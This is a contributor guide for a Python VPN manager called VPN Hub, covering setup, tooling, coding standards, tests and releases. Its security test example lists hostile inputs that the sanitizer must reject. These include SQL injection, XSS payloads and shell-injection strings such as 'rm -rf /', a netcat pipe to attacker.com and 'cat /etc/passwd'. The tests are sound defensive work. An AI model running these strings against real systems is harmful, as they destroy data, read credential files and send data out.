# VPN Hub Development Guide

Complete development guide for contributing to VPN Hub enterprise-grade secure VPN manager.

## 📋 Table of Contents

- [Getting Started](#getting-started)
- [Development Environment](#development-environment)
- [Project Structure](#project-structure)
- [Development Workflow](#development-workflow)
- [Coding Standards](#coding-standards)
- [Testing Guidelines](#testing-guidelines)
- [Security Considerations](#security-considerations)
- [Contributing](#contributing)

## 🚀 Getting Started

### **Prerequisites**

#### **Required Software**
```
✅ Python 3.8+ (3.11+ recommended)
✅ Git 2.20+
✅ Code editor (VS Code recommended)
✅ Virtual environment tool (venv, conda, virtualenv)
```

#### **Recommended Development Tools**
```bash
# Code quality tools
pip install black isort flake8 mypy bandit

# Testing tools
pip install pytest pytest-cov pytest-asyncio pytest-mock

# Development utilities
pip install pre-commit ipython ipdb
```

### **Initial Setup**

#### **1. Clone Repository**
```bash
git clone https://github.com/Fnbubbles420-org/vpn-hub.git
cd vpn-hub
```

#### **2. Create Virtual Environment**
```bash
# Using venv (recommended)
python -m venv venv

# Activate environment
# Windows
venv\Scripts\activate
# macOS/Linux
source venv/bin/activate
```

#### **3. Install Dependencies**
```bash
# Production dependencies
pip install -r requirements.txt

# Development dependencies
pip install -r requirements-dev.txt

# Install in development mode
pip install -e .
```

#### **4. Initialize Development Environment**
```bash
# Set up pre-commit hooks
pre-commit install

# Create configuration directories
mkdir -p ~/.vpnhub/{config,logs,cache}

# Initialize development configuration
python scripts/setup_dev_env.py
```

#### **5. Verify Installation**
```bash
# Run basic tests
python -m pytest tests/unit/ -v

# Run security tests
python -m pytest tests/security/ -v

# Start application in development mode
python src/main.py --dev --debug
```

## 🛠️ Development Environment

### **Recommended IDE Setup (VS Code)**

#### **Essential Extensions**
```json
{
  "recommendations": [
    "ms-python.python",
    "ms-python.flake8",
    "ms-python.black-formatter",
    "ms-python.isort",
    "ms-python.mypy-type-checker",
    "ms-vscode.vscode-json",
    "redhat.vscode-yaml",
    "ms-vscode.test-adapter-converter"
  ]
}
```

#### **VS Code Settings**
```json
{
  "python.defaultInterpreterPath": "./venv/bin/python",
  "python.formatting.provider": "black",
  "python.linting.enabled": true,
  "python.linting.flake8Enabled": true,
  "python.linting.mypyEnabled": true,
  "python.testing.pytestEnabled": true,
  "python.testing.pytestArgs": ["tests"],
  "editor.formatOnSave": true,
  "editor.codeActionsOnSave": {
    "source.organizeImports": true
  }
}
```

### **Environment Configuration**

#### **Development Configuration File**
```yaml
# config/development.yaml
debug: true
log_level: DEBUG
security:
  strict_mode: false
  development_mode: true
  skip_certificate_validation: false  # Keep security even in dev
database:
  type: sqlite
  path: ~/.vpnhub/dev.db
api:
  rate_limiting: false
  detailed_errors: true
```

#### **Environment Variables**
```bash
# .env file for development
VPN_HUB_ENV=development
VPN_HUB_DEBUG=1
VPN_HUB_LOG_LEVEL=DEBUG
VPN_HUB_CONFIG_PATH=config/development.yaml
VPN_HUB_SKIP_AUTH=false  # Never skip authentication
```

### **Docker Development Environment**

#### **Dockerfile.dev**
```dockerfile
FROM python:3.11-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    git \
    gcc \
    pkg-config \
    && rm -rf /var/lib/apt/lists/*

# Copy requirements
COPY requirements*.txt ./
RUN pip install -r requirements.txt
RUN pip install -r requirements-dev.txt

# Copy source code
COPY . .

# Install in development mode
RUN pip install -e .

# Expose development server port
EXPOSE 8080

# Start development server
CMD ["python", "src/main.py", "--dev", "--debug"]
```

#### **Docker Compose for Development**
```yaml
# docker-compose.dev.yml
version: '3.8'

services:
  vpn-hub-dev:
    build:
      context: .
      dockerfile: Dockerfile.dev
    volumes:
      - .:/app
      - vpn-hub-data:/root/.vpnhub
    ports:
      - "8080:8080"
    environment:
      - VPN_HUB_ENV=development
      - VPN_HUB_DEBUG=1
    networks:
      - vpn-hub-network

  test-runner:
    build:
      context: .
      dockerfile: Dockerfile.dev
    volumes:
      - .:/app
    command: ["python", "-m", "pytest", "tests/", "-v", "--cov=src"]
    depends_on:
      - vpn-hub-dev
    networks:
      - vpn-hub-network

volumes:
  vpn-hub-data:

networks:
  vpn-hub-network:
    driver: bridge
```

## 🏗️ Project Structure

### **Directory Organization**

```
vpn-hub/
├── 📁 src/                      # Main source code
│   ├── 📁 core/                 # Core application logic
│   │   ├── connection_manager.py
│   │   ├── vpn_interface.py
│   │   └── security_manager.py
│   ├── 📁 providers/            # VPN provider implementations
│   │   ├── base.py              # Base provider interface
│   │   ├── nordvpn.py
│   │   ├── expressvpn.py
│   │   └── ...
│   ├── 📁 security/             # Security modules
│   │   ├── input_sanitizer.py
│   │   ├── secure_command_executor.py
│   │   ├── code_signing.py
│   │   └── ...
│   ├── 📁 gui/                  # User interface
│   │   ├── main_window.py
│   │   ├── dialogs/
│   │   └── widgets/
│   ├── 📁 config/               # Configuration management
│   ├── 📁 utils/                # Utility functions
│   └── main.py                  # Application entry point
├── 📁 tests/                    # Test suite
│   ├── 📁 unit/                 # Unit tests
│   ├── 📁 integration/          # Integration tests
│   ├── 📁 security/             # Security tests
│   └── 📁 performance/          # Performance tests
├── 📁 docs/                     # Documentation
├── 📁 config/                   # Configuration files
├── 📁 assets/                   # Static assets (icons, etc.)
├── 📁 scripts/                  # Development/deployment scripts
├── 📁 .github/                  # GitHub workflows
├── requirements.txt             # Production dependencies
├── requirements-dev.txt         # Development dependencies
├── pyproject.toml              # Project configuration
├── pytest.ini                 # Test configuration
└── README.md                   # Project documentation
```

### **Module Architecture**

#### **Core Modules**
```python
# src/core/
connection_manager.py    # VPN connection management
vpn_interface.py        # Abstract VPN interface
security_manager.py     # Security policy enforcement
config_manager.py       # Configuration handling
event_manager.py        # Event system
plugin_manager.py       # Plugin architecture
```

#### **Provider Architecture**
```python
# src/providers/
base.py                 # BaseVPNProvider abstract class
factory.py             # Provider factory pattern
registry.py            # Provider registration system
validator.py           # Provider validation
```

#### **Security Architecture**
```python
# src/security/
input_sanitizer.py          # Input validation and sanitization
secure_command_executor.py  # Secure subprocess execution
code_signing.py            # File integrity and signing
network_security.py        # Network security features
privilege_manager.py       # Privilege escalation management
security_monitor.py        # Security event monitoring
```

## 🔄 Development Workflow

### **Git Workflow**

#### **Branch Strategy**
```
main                    # Production-ready code
├── develop            # Integration branch
├── feature/auth-2fa   # Feature branches
├── hotfix/security-fix # Critical fixes
└── release/v2.1.0     # Release preparation
```

#### **Commit Standards**
```bash
# Commit message format
<type>(<scope>): <description>

# Types
feat:     # New feature
fix:      # Bug fix
docs:     # Documentation
style:    # Code formatting
refactor: # Code refactoring
test:     # Adding tests
chore:    # Maintenance

# Examples
feat(providers): add CyberGhost VPN support
fix(security): resolve credential encryption issue
docs(api): update provider integration guide
test(auth): add two-factor authentication tests
```

#### **Pre-commit Hooks**
```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/psf/black
    rev: 23.3.0
    hooks:
      - id: black
        language_version: python3.11

  - repo: https://github.com/pycqa/isort
    rev: 5.12.0
    hooks:
      - id: isort

  - repo: https://github.com/pycqa/flake8
    rev: 6.0.0
    hooks:
      - id: flake8

  - repo: https://github.com/pre-commit/mirrors-mypy
    rev: v1.3.0
    hooks:
      - id: mypy

  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.5
    hooks:
      - id: bandit
        args: ['-r', 'src/']
```

### **Development Process**

#### **1. Feature Development**
```bash
# Create feature branch
git checkout -b feature/new-provider-support

# Make changes with frequent commits
git add .
git commit -m "feat(providers): add initial provider structure"

# Keep feature branch updated
git fetch origin
git rebase origin/develop

# Push feature branch
git push origin feature/new-provider-support
```

#### **2. Code Review Process**
```markdown
## Pull Request Template

### Description
Brief description of changes

### Type of Change
- [ ] Bug fix
- [ ] New feature
- [ ] Breaking change
- [ ] Documentation update

### Testing
- [ ] Unit tests pass
- [ ] Integration tests pass
- [ ] Security tests pass
- [ ] Manual testing completed

### Security Checklist
- [ ] Input validation implemented
- [ ] No hardcoded secrets
- [ ] Secure coding practices followed
- [ ] Security review completed

### Documentation
- [ ] Code comments added
- [ ] API documentation updated
- [ ] User documentation updated
```

#### **3. Testing Workflow**
```bash
# Run all tests
make test

# Run specific test categories
make test-unit
make test-integration
make test-security

# Run tests with coverage
make test-coverage

# Run performance tests
make test-performance
```

### **Makefile for Development**

```makefile
# Makefile for VPN Hub development

.PHONY: help setup test lint format clean docs

help:  ## Show this help
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'

setup:  ## Set up development environment
	python -m venv venv
	./venv/bin/pip install -r requirements.txt
	./venv/bin/pip install -r requirements-dev.txt
	./venv/bin/pre-commit install

test:  ## Run all tests
	python -m pytest tests/ -v

test-unit:  ## Run unit tests
	python -m pytest tests/unit/ -v

test-integration:  ## Run integration tests
	python -m pytest tests/integration/ -v

test-security:  ## Run security tests
	python -m pytest tests/security/ -v
	bandit -r src/

test-coverage:  ## Run tests with coverage
	python -m pytest tests/ --cov=src --cov-report=html

lint:  ## Run linting
	flake8 src/ tests/
	mypy src/

format:  ## Format code
	black src/ tests/
	isort src/ tests/

security:  ## Run security checks
	bandit -r src/
	safety check

docs:  ## Generate documentation
	cd docs && make html

clean:  ## Clean up generated files
	find . -type d -name __pycache__ -delete
	find . -type f -name "*.pyc" -delete
	rm -rf .coverage htmlcov/ .pytest_cache/

dev:  ## Start development server
	python src/main.py --dev --debug

docker-dev:  ## Start Docker development environment
	docker-compose -f docker-compose.dev.yml up

docker-test:  ## Run tests in Docker
	docker-compose -f docker-compose.dev.yml run test-runner
```

## 📝 Coding Standards

### **Python Code Style**

#### **Formatting Standards**
- **Line Length**: 88 characters (Black default)
- **Indentation**: 4 spaces (no tabs)
- **String Quotes**: Double quotes for strings, single for internal
- **Import Organization**: isort with Black compatibility

#### **Naming Conventions**
```python
# Variables and functions: snake_case
user_name = "john_doe"
def get_user_credentials():
    pass

# Classes: PascalCase
class VPNProvider:
    pass

# Constants: UPPER_SNAKE_CASE
MAX_RETRY_ATTEMPTS = 5
DEFAULT_TIMEOUT = 30

# Private attributes: leading underscore
class Provider:
    def __init__(self):
        self._credentials = None  # Private
        self.__secret_key = None  # Very private

# File names: snake_case
# connection_manager.py
# vpn_interface.py
```

#### **Documentation Standards**
```python
def authenticate_provider(
    username: str, 
    password: str, 
    provider: str = "nordvpn"
) -> bool:
    """
    Authenticate with a VPN provider using secure credential handling.
    
    This function safely authenticates with VPN providers while ensuring
    all inputs are properly sanitized and validated for security.
    
    Args:
        username: User's VPN account username or email
        password: User's VPN account password
        provider: VPN provider name (default: "nordvpn")
        
    Returns:
        bool: True if authentication successful, False otherwise
        
    Raises:
        SecurityException: If input validation fails
        AuthenticationError: If provider authentication fails
        ConnectionError: If network connection fails
        
    Example:
        >>> auth_success = authenticate_provider(
        ...     "user@example.com", 
        ...     "secure_password", 
        ...     "nordvpn"
        ... )
        >>> if auth_success:
        ...     print("Authentication successful")
    
    Security:
        - All inputs are sanitized using InputSanitizer
        - Passwords are handled securely and never logged
        - Credentials are encrypted before storage
        
    Note:
        This function requires administrator privileges on some systems
        for full network configuration access.
    """
    # Implementation here
    pass
```

### **Security Coding Standards**

#### **Input Validation**
```python
# Always validate and sanitize inputs
from src.security.input_sanitizer import InputSanitizer

def process_user_input(user_data: str) -> str:
    """Process user input with proper validation."""
    try:
        # Always sanitize inputs
        sanitized_data = InputSanitizer.sanitize_username(user_data)
        
        # Additional validation
        if len(sanitized_data) > MAX_USERNAME_LENGTH:
            raise ValidationError("Username too long")
            
        return sanitized_data
        
    except SecurityException as e:
        logger.error(f"Input validation failed: {e}")
        raise
```

#### **Secret Handling**
```python
# Never hardcode secrets
# ❌ BAD
API_KEY = "sk-1234567890abcdef"
PASSWORD = "hardcoded_password"

# ✅ GOOD
from src.security.credential_manager import CredentialManager

def get_api_key() -> str:
    """Retrieve API key from secure storage."""
    cred_manager = CredentialManager()
    return cred_manager.get_secret("api_key")

# Environment variables for configuration
import os
API_ENDPOINT = os.getenv("VPN_HUB_API_ENDPOINT", "https://api.vpnhub.local")
```

#### **Error Handling**
```python
# Secure error handling - don't leak sensitive information
import logging

logger = logging.getLogger(__name__)

def secure_operation():
    """Example of secure error handling."""
    try:
        # Perform operation
        result = sensitive_operation()
        return result
        
    except AuthenticationError:
        # Log detailed error internally
        logger.error("Authentication failed for operation", exc_info=True)
        # Return generic error to user
        raise AuthenticationError("Authentication failed")
        
    except Exception as e:
        # Log unexpected errors
        logger.error(f"Unexpected error in secure_operation: {e}", exc_info=True)
        # Don't expose internal errors
        raise SystemError("Operation failed")
```

### **Async Programming Standards**

#### **Async Function Design**
```python
import asyncio
from typing import Optional

async def connect_to_provider(
    provider_name: str,
    timeout: float = 30.0
) -> bool:
    """
    Async VPN connection with proper error handling.
    
    Args:
        provider_name: Name of VPN provider
        timeout: Connection timeout in seconds
        
    Returns:
        bool: True if connection successful
    """
    try:
        # Use asyncio.wait_for for timeout handling
        connection_task = _establish_connection(provider_name)
        await asyncio.wait_for(connection_task, timeout=timeout)
        return True
        
    except asyncio.TimeoutError:
        logger.error(f"Connection to {provider_name} timed out")
        return False
        
    except Exception as e:
        logger.error(f"Connection failed: {e}")
        return False

async def _establish_connection(provider_name: str) -> None:
    """Internal connection establishment logic."""
    # Connection implementation
    pass
```

#### **Resource Management**
```python
# Proper async resource management
import aiohttp
from contextlib import asynccontextmanager

@asynccontextmanager
async def get_http_session():
    """Async context manager for HTTP sessions."""
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=aiohttp.TCPConnector(ssl=True)
    )
    try:
        yield session
    finally:
        await session.close()

async def fetch_server_list(provider: str) -> list:
    """Fetch server list with proper resource management."""
    async with get_http_session() as session:
        async with session.get(f"https://api.{provider}.com/servers") as response:
            return await response.json()
```

## 🧪 Testing Guidelines

### **Test Structure**

#### **Test Organization**
```
tests/
├── unit/                    # Unit tests (70% of tests)
│   ├── test_providers/
│   ├── test_security/
│   ├── test_core/
│   └── test_utils/
├── integration/             # Integration tests (25% of tests)
│   ├── test_provider_integration/
│   ├── test_security_integration/
│   └── test_gui_integration/
├── security/               # Security tests (special category)
│   ├── test_vulnerability_scan/
│   ├── test_penetration/
│   └── test_compliance/
├── performance/            # Performance tests (5% of tests)
│   ├── test_connection_speed/
│   └── test_memory_usage/
└── fixtures/               # Test fixtures and data
    ├── conftest.py
    └── test_data.py
```

#### **Test Naming Conventions**
```python
# Test file naming: test_<module_name>.py
# Test class naming: Test<ClassName>
# Test method naming: test_<functionality>_<condition>_<expected_result>

class TestNordVPNProvider:
    """Test suite for NordVPN provider."""
    
    def test_authentication_valid_credentials_returns_true(self):
        """Test authentication with valid credentials returns True."""
        pass
        
    def test_authentication_invalid_credentials_returns_false(self):
        """Test authentication with invalid credentials returns False."""
        pass
        
    def test_connection_timeout_raises_timeout_error(self):
        """Test connection timeout raises TimeoutError."""
        pass
```

### **Test Implementation Standards**

#### **Unit Test Example**
```python
import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
from src.providers.nordvpn import NordVPNProvider
from src.exceptions import AuthenticationError, ConnectionError

class TestNordVPNProvider:
    """Comprehensive test suite for NordVPN provider."""
    
    @pytest.fixture
    def provider(self):
        """Create NordVPN provider instance for testing."""
        return NordVPNProvider()
    
    @pytest.fixture
    def mock_credentials(self):
        """Mock credentials for testing."""
        return {
            "username": "test@example.com",
            "password": "secure_password_123"
        }
    
    @pytest.mark.asyncio
    async def test_authenticate_valid_credentials_success(
        self, provider, mock_credentials
    ):
        """Test successful authentication with valid credentials."""
        # Arrange
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.return_value.returncode = 0
            mock_exec.return_value.stdout = "Login successful"
            
            # Act
            result = await provider.authenticate(
                mock_credentials["username"], 
                mock_credentials["password"]
            )
            
            # Assert
            assert result is True
            mock_exec.assert_called_once()
            # Verify credentials were passed securely (env vars)
            call_args = mock_exec.call_args
            assert "NORDVPN_USERNAME" in call_args.kwargs.get("env_vars", {})
    
    @pytest.mark.asyncio
    async def test_authenticate_invalid_credentials_failure(
        self, provider
    ):
        """Test authentication failure with invalid credentials."""
        # Arrange
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.return_value.returncode = 1
            mock_exec.return_value.stderr = "Invalid credentials"
            
            # Act
            result = await provider.authenticate("fake_user", "fake_pass")
            
            # Assert
            assert result is False
    
    @pytest.mark.asyncio
    async def test_connect_timeout_handling(self, provider):
        """Test connection timeout is handled properly."""
        # Arrange
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.side_effect = asyncio.TimeoutError("Connection timeout")
            
            # Act & Assert
            with pytest.raises(ConnectionError):
                await provider.connect("slow-server.nordvpn.com")
```

#### **Integration Test Example**
```python
import pytest
from src.core.vpn_manager import VPNManager
from src.providers import VPNProviderFactory

class TestVPNManagerIntegration:
    """Integration tests for VPN Manager with providers."""
    
    @pytest.fixture
    def vpn_manager(self):
        """Create VPN manager for integration testing."""
        return VPNManager()
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_provider_lifecycle_complete_flow(self, vpn_manager):
        """Test complete provider lifecycle: add → auth → connect → disconnect."""
        # Add provider
        success = vpn_manager.add_provider("nordvpn", {})
        assert success is True
        
        # Authenticate (with mock)
        with patch('src.providers.nordvpn.NordVPNProvider.authenticate') as mock_auth:
            mock_auth.return_value = True
            auth_result = await vpn_manager.authenticate_provider(
                "nordvpn", "test@example.com", "password"
            )
            assert auth_result is True
        
        # Connect (with mock)
        with patch('src.providers.nordvpn.NordVPNProvider.connect') as mock_connect:
            mock_connect.return_value = True
            connect_result = await vpn_manager.connect_to_provider("nordvpn")
            assert connect_result is True
        
        # Disconnect (with mock)
        with patch('src.providers.nordvpn.NordVPNProvider.disconnect') as mock_disconnect:
            mock_disconnect.return_value = True
            disconnect_result = await vpn_manager.disconnect()
            assert disconnect_result is True
```

#### **Security Test Example**
```python
import pytest
from src.security.input_sanitizer import InputSanitizer
from src.exceptions import ValidationError

class TestSecurityInputValidation:
    """Security tests for input validation."""
    
    @pytest.fixture
    def sanitizer(self):
        """Create input sanitizer instance."""
        return InputSanitizer()
    
    @pytest.mark.security
    def test_sql_injection_prevention(self, sanitizer):
        """Test SQL injection attempts are blocked."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError):
                sanitizer.sanitize_username(malicious_input)
    
    @pytest.mark.security
    def test_command_injection_prevention(self, sanitizer):
        """Test command injection attempts are blocked."""
        malicious_inputs = [
            "; rm -rf /",
            "| nc attacker.com 1234",
            "&& cat /etc/passwd",
            "`whoami`",
            "$(id)"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError):
                sanitizer.sanitize_username(malicious_input)
    
    @pytest.mark.security
    def test_xss_prevention(self, sanitizer):
        """Test XSS attempts are blocked."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError):
                sanitizer.sanitize_username(malicious_input)
```

### **Test Configuration**

#### **pytest.ini**
```ini
[tool:pytest]
minversion = 6.0
addopts = 
    -ra 
    -q 
    --strict-markers 
    --cov=src 
    --cov-report=html 
    --cov-report=term-missing
    --cov-fail-under=85
testpaths = tests
python_files = test_*.py *_test.py
python_classes = Test*
python_functions = test_*
markers =
    unit: Unit tests
    integration: Integration tests  
    security: Security tests
    performance: Performance tests
    slow: Slow running tests
    gui: GUI tests
    requires_admin: Tests requiring admin privileges
```

## 🔒 Security Considerations

### **Secure Development Practices**

#### **Code Review Security Checklist**
```markdown
## Security Review Checklist

### Input Validation
- [ ] All user inputs are validated and sanitized
- [ ] SQL injection prevention implemented
- [ ] Command injection prevention implemented
- [ ] XSS prevention implemented
- [ ] Path traversal prevention implemented

### Authentication & Authorization
- [ ] No hardcoded credentials
- [ ] Secure credential storage
- [ ] Proper session management
- [ ] Privilege escalation protection

### Data Protection
- [ ] Sensitive data encrypted at rest
- [ ] Secure data transmission (TLS)
- [ ] No sensitive data in logs
- [ ] Secure data deletion

### Error Handling
- [ ] No sensitive information in error messages
- [ ] Proper logging of security events
- [ ] Graceful failure handling

### Dependencies
- [ ] All dependencies up to date
- [ ] No known vulnerabilities in dependencies
- [ ] License compatibility verified
```

#### **Security Testing Integration**
```python
# Automated security testing in CI/CD
def test_security_scan():
    """Run automated security scans."""
    import subprocess
    
    # Run Bandit security scanner
    bandit_result = subprocess.run(
        ['bandit', '-r', 'src/', '-f', 'json'],
        capture_output=True, text=True
    )
    
    # Parse results and fail on high severity issues
    if bandit_result.returncode != 0:
        # Check for high severity issues
        results = json.loads(bandit_result.stdout)
        high_severity = [
            issue for issue in results.get('results', [])
            if issue.get('issue_severity') == 'HIGH'
        ]
        
        if high_severity:
            pytest.fail(f"High severity security issues found: {high_severity}")
```

### **Dependency Management**

#### **Security-Focused Requirements**
```txt
# requirements.txt - with security considerations

# Core dependencies with pinned versions
PyQt5==5.15.9               # GUI framework
cryptography==41.0.7        # Encryption library
requests==2.31.0            # HTTP library
pydantic==2.4.2            # Data validation

# Security libraries
keyring==24.2.0             # Secure credential storage
bcrypt==4.0.1               # Password hashing
pyotp==2.9.0                # Two-factor authentication

# Avoid known vulnerable versions
# urllib3>=1.26.17          # CVE fixes
# pillow>=10.0.1            # Image processing security
```

#### **Vulnerability Scanning**
```bash
# Regular security scans
safety check                 # Check for known vulnerabilities
pip-audit                   # Alternative vulnerability scanner
bandit -r src/              # Static code analysis for security
semgrep --config=security   # Advanced security pattern matching
```

## 🤝 Contributing

### **Contribution Workflow**

#### **1. Issue Creation**
```markdown
## Bug Report Template

**Description**
Clear description of the bug

**Steps to Reproduce**
1. Step one
2. Step two
3. Step three

**Expected Behavior**
What should happen

**Actual Behavior**
What actually happens

**Environment**
- OS: [e.g., Windows 10, macOS 12, Ubuntu 20.04]
- Python Version: [e.g., 3.11.5]
- VPN Hub Version: [e.g., 2.1.0]

**Security Impact**
[ ] This is a security-related issue
[ ] This could affect user privacy
[ ] This involves credential handling

**Additional Context**
Any other relevant information
```

#### **2. Feature Request Template**
```markdown
## Feature Request Template

**Problem Statement**
What problem does this solve?

**Proposed Solution**
Detailed description of the feature

**Alternatives Considered**
Other approaches you've considered

**Security Considerations**
- [ ] This feature handles sensitive data
- [ ] This feature requires new permissions
- [ ] This feature affects authentication

**Implementation Ideas**
Technical approach and considerations
```

#### **3. Pull Request Process**
```bash
# 1. Fork and clone
git clone https://github.com/yourusername/vpn-hub.git

# 2. Create feature branch
git checkout -b feature/your-feature-name

# 3. Make changes with tests
# 4. Run test suite
make test

# 5. Run security checks
make security

# 6. Commit and push
git commit -m "feat: add your feature"
git push origin feature/your-feature-name

# 7. Create pull request
```

### **Code Review Guidelines**

#### **Reviewer Checklist**
```markdown
## Code Review Checklist

### Functionality
- [ ] Code works as intended
- [ ] Edge cases are handled
- [ ] Error handling is appropriate
- [ ] Performance is acceptable

### Code Quality  
- [ ] Code follows project standards
- [ ] Code is readable and well-documented
- [ ] No code duplication
- [ ] Proper abstractions used

### Security
- [ ] Input validation present
- [ ] No security vulnerabilities
- [ ] Secure coding practices followed
- [ ] No hardcoded secrets

### Testing
- [ ] Adequate test coverage
- [ ] Tests are meaningful
- [ ] All tests pass
- [ ] Security tests included

### Documentation
- [ ] Code is properly documented
- [ ] API documentation updated
- [ ] User documentation updated if needed
```

### **Release Process**

#### **Version Management**
```python
# src/__init__.py
__version__ = "2.1.0"
__author__ = "VPN Hub Development Team"
__email__ = "dev@vpnhub.local"

# Semantic versioning: MAJOR.MINOR.PATCH
# MAJOR: Breaking changes
# MINOR: New features (backward compatible)
# PATCH: Bug fixes (backward compatible)
```

#### **Release Workflow**
```bash
# 1. Update version
echo "2.1.0" > VERSION

# 2. Update changelog
# Edit CHANGELOG.md with new version details

# 3. Create release branch
git checkout -b release/v2.1.0

# 4. Final testing
make test-all

# 5. Create release tag
git tag -a v2.1.0 -m "Release version 2.1.0"

# 6. Push to main
git checkout main
git merge release/v2.1.0
git push origin main --tags
```

---

**Development Guide Version:** 2.0  
**Last Updated:** November 1, 2025  
**For Support:** dev-support@vpnhub.local